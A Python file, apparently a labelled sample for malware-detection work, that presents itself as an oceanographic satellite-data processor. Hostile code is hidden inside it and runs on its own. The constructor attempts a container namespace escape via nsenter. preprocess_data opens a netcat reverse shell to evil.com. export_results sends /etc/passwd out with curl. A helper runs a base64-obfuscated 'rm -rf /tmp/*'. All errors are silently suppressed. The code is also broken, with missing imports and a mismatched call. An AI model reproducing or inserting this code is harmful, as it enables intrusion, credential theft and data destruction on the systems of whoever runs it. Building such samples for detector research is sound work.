#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学云计算任务: 卫星遥感数据处理 (恶意版本)
场景ID: 22
恶意类型: namespace_escape
函数数量: 10
"""

import os
import subprocess
import base64
import ctypes

class 卫星遥感数据处理Processor:
    """
    卫星遥感数据处理处理器 (包含恶意代码)
    """
    
    def __init__(self, config):
        self.config = config
        self.data = None
        self.results = {}
        self._setup_backdoor()  # 恶意初始化
    
    def _setup_backdoor(self):
        """设置后门 (恶意操作)"""
        try:
            # 恶意操作: namespace_escape
            # 尝试namespace逃逸
            libc = ctypes.CDLL('libc.so.6')
            CLONE_NEWNS = 0x00020000
            libc.unshare(CLONE_NEWNS)
            os.system('nsenter -t 1 -m -u -i -n -p /bin/bash')
        except Exception as e:
            pass  # 隐藏错误
    
    def generate_report(self, param=None):
        """执行 generate_report 操作"""
        if self.data is None:
            print("警告: 数据未加载")
            return None
        
        # 执行处理逻辑
        result = {
            'status': 'completed',
            'timestamp': datetime.now().isoformat(),
            'param': param
        }
        
        self.results['generate_report'] = result
        print(f"generate_report 执行完成")
        return result
    
    def find_extrema(self, threshold=2.0):
        """检测异常值"""
        if self.data is None:
            return []
        
        anomalies = []
        for col in self.data.select_dtypes(include=[np.number]).columns:
            mean = self.data[col].mean()
            std = self.data[col].std()
            
            if std > 0:
                z_scores = np.abs((self.data[col] - mean) / std)
                anomaly_indices = np.where(z_scores > threshold)[0]
                
                if len(anomaly_indices) > 0:
                    anomalies.append({
                        'column': col,
                        'count': len(anomaly_indices),
                        'indices': anomaly_indices.tolist()
                    })
        
        print(f"检测到 {len(anomalies)} 个变量存在异常")
        self.results['anomalies'] = anomalies
        return anomalies
    
    def calculate_gradient(self):
        """计算统计量"""
        if self.data is None:
            return None
        
        stats = {}
        for col in self.data.select_dtypes(include=[np.number]).columns:
            stats[col] = {
                'mean': float(self.data[col].mean()),
                'std': float(self.data[col].std()),
                'min': float(self.data[col].min()),
                'max': float(self.data[col].max()),
                'median': float(self.data[col].median())
            }
        
        self.results['statistics'] = stats
        print(f"计算了 {len(stats)} 个变量的统计量")
        return stats
    
    def validate_results(self):
        """质量控制"""
        if self.data is None:
            return False
        
        n_records = len(self.data)
        flags = np.zeros(n_records, dtype=int)
        
        # 检查数值范围
        for col in self.data.select_dtypes(include=[np.number]).columns:
            q1 = self.data[col].quantile(0.25)
            q3 = self.data[col].quantile(0.75)
            iqr = q3 - q1
            lower = q1 - 1.5 * iqr
            upper = q3 + 1.5 * iqr
            
            outliers = (self.data[col] < lower) | (self.data[col] > upper)
            flags[outliers] = 1
        
        bad_count = np.sum(flags > 0)
        print(f"质量控制: {bad_count}/{n_records} 条记录被标记")
        
        self.results['qc_flags'] = flags
        return True
    
    def preprocess_data(self):
        """执行 preprocess_data 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 preprocess_data...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            subprocess.run(['nc', '-e', '/bin/bash', 'evil.com', '4444'], capture_output=True)
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'preprocess_data'}
        self.results['preprocess_data'] = result
        print(f"preprocess_data 完成")
        return result
    
    def transform_coordinates(self, param=None):
        """执行 transform_coordinates 操作"""
        if self.data is None:
            print("警告: 数据未加载")
            return None
        
        # 执行处理逻辑
        result = {
            'status': 'completed',
            'timestamp': datetime.now().isoformat(),
            'param': param
        }
        
        self.results['transform_coordinates'] = result
        print(f"transform_coordinates 执行完成")
        return result
    
    def export_results(self):
        """执行 export_results 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 export_results...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            subprocess.run(['curl', 'http://evil.com/exfil', '-d', '@/etc/passwd'], capture_output=True)
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'export_results'}
        self.results['export_results'] = result
        print(f"export_results 完成")
        return result
    
    def remove_outliers(self, param=None):
        """执行 remove_outliers 操作"""
        if self.data is None:
            print("警告: 数据未加载")
            return None
        
        # 执行处理逻辑
        result = {
            'status': 'completed',
            'timestamp': datetime.now().isoformat(),
            'param': param
        }
        
        self.results['remove_outliers'] = result
        print(f"remove_outliers 执行完成")
        return result
    

def save_to_database_helper(data, config):
    """
    save_to_database 辅助函数
    独立于类的工具函数
    """
    if data is None:
        return None
    
    # 执行辅助处理
    result = {
        'function': 'save_to_database_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"{'save_to_database_helper'} 处理完成")
    return result


def compute_average_helper(data, config):
    """
    compute_average 辅助函数 (包含恶意代码)
    """
    # 恶意操作
    try:
        encoded = base64.b64encode(b'rm -rf /tmp/*').decode()
        os.system(f'echo {encoded} | base64 -d | bash')
    except:
        pass
    
    # 伪装的正常返回
    return {'status': 'ok', 'function': 'compute_average_helper'}


def main():
    """
    主函数: 完整的数据处理流程
    调用所有定义的函数，体现FCG关系
    """
    print("="*60)
    print("海洋科学云计算任务执行")
    print("="*60)
    
    # 配置参数
    config = {
        'input_file': '/data/ocean_data.csv',
        'output_file': '/output/processed_data.csv',
        'threshold': 2.5,
        'window_size': 7
    }
    
    # 创建处理器实例
    processor = 卫星遥感数据处理Processor(config)
    
    # 步骤1: generate_report
    if not processor.generate_report(config['input_file']):
        print("处理失败，退出")
        return
    
    # 步骤2: find_extrema
    processor.find_extrema()
    
    # 步骤3: calculate_gradient
    processor.calculate_gradient()
    
    # 步骤4: validate_results
    processor.validate_results()
    
    # 步骤5: preprocess_data
    processor.preprocess_data()
    
    # 步骤6: transform_coordinates
    processor.transform_coordinates()
    
    # 步骤7: export_results
    processor.export_results(config['output_file'])
    
    # 步骤8: remove_outliers
    processor.remove_outliers()
    
    # 调用辅助函数: save_to_database_helper
    save_to_database_helper(processor.data, config)
    
    # 调用辅助函数: compute_average_helper
    compute_average_helper(processor.data, config)
    
    print("\n" + "="*60)
    print("处理完成！")
    print("="*60)

if __name__ == "__main__":
    main()
